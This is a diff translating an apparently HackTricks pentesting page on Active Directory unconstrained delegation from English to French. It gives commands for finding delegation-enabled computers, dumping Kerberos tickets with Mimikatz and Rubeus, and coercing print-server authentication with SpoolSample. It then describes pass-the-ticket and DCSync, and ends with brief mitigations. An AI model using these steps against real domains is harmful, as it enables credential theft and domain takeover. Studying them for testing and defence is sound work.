@@ -1,56 +1,53 @@
-# Unconstrained Delegation
+# Délégation non contrainte
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Unconstrained delegation
+## Délégation non contrainte
 
-This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.
+C'est une fonctionnalité qu'un administrateur de domaine peut définir pour n'importe quel **ordinateur** à l'intérieur du domaine. Ensuite, chaque fois qu'un **utilisateur se connecte** à l'ordinateur, une **copie du TGT** de cet utilisateur va être **envoyée dans le TGS** fourni par le DC **et sauvegardée en mémoire dans LSASS**. Donc, si vous avez des privilèges d'administrateur sur la machine, vous pourrez **extraire les tickets et usurper les utilisateurs** sur n'importe quelle machine.
 
-So if a domain admin logins inside a Computer with "Unconstrained Delegation" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc).
+Ainsi, si un administrateur de domaine se connecte à un ordinateur avec la fonctionnalité "Délégation non contrainte" activée, et que vous avez des privilèges d'administrateur local sur cette machine, vous pourrez extraire le ticket et usurper l'administrateur de domaine n'importe où (élévation de privilèges de domaine).
 
-You can **find Computer objects with this attribute** checking if the [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute contains [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does:
+Vous pouvez **trouver des objets ordinateur avec cet attribut** en vérifiant si l'attribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contient [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Vous pouvez le faire avec un filtre LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ce que fait powerview :
 
-<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
+<pre class="language-bash"><code class="lang-bash"># Lister les ordinateurs non contraints
 ## Powerview
-Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
+Get-NetComputer -Unconstrained #Les DC apparaissent toujours mais ne sont pas utiles pour l'élévation de privilèges
 <strong>## ADSearch
 </strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
-<strong># Export tickets with Mimikatz
+<strong># Exporter les tickets avec Mimikatz
 </strong>privilege::debug
-sekurlsa::tickets /export #Recommended way
-kerberos::list /export #Another way
+sekurlsa::tickets /export #Méthode recommandée
+kerberos::list /export #Une autre méthode
 
-# Monitor logins and export new tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>
+# Surveiller les connexions et exporter de nouveaux tickets
+.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Vérifier toutes les 10s pour de nouveaux TGTs</code></pre>
 
-Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
-More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
-[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+Chargez le ticket de l'administrateur (ou de l'utilisateur victime) en mémoire avec **Mimikatz** ou **Rubeus pour un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
+Plus d'infos : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
+[**Plus d'informations sur la délégation non contrainte dans ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
 
-### **Force Authentication**
+### **Forcer l'authentification**
 
-If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
-Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.
+Si un attaquant est capable de **compromettre un ordinateur autorisé pour "Délégation non contrainte"**, il pourrait **tromper** un **serveur d'impression** pour **se connecter automatiquement** contre lui **sauvegardant un TGT** dans la mémoire du serveur.\
+Ensuite, l'attaquant pourrait effectuer une **attaque Pass the Ticket pour usurper** le compte d'ordinateur du serveur d'impression.
 
-To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
-
+Pour faire se connecter un serveur d'impression contre n'importe quelle machine, vous pouvez utiliser [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
+Si le TGT provient d'un contrôleur de domaine, vous pourriez effectuer une [**attaque DCSync**](acl-persistence-abuse/#dcsync) et obtenir tous les hachages du DC.\
+[**Plus d'infos sur cette attaque sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
 
-If the TGT if from a domain controller, you could perform a[ **DCSync attack**](acl-persistence-abuse/#dcsync) and obtain all the hashes from the DC.\
-[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
-
-**Here are other ways to try to force an authentication:**
+**Voici d'autres façons d'essayer de forcer une authentification :**
 
 {{#ref}}
 printers-spooler-service-abuse.md
 {{#endref}}
 
-### Mitigation
+### Atténuation
 
-- Limit DA/Admin logins to specific services
-- Set "Account is sensitive and cannot be delegated" for privileged accounts.
+- Limiter les connexions DA/Admin à des services spécifiques
+- Définir "Le compte est sensible et ne peut pas être délégué" pour les comptes privilégiés.
 
 {{#include ../../banners/hacktricks-training.md}}
-
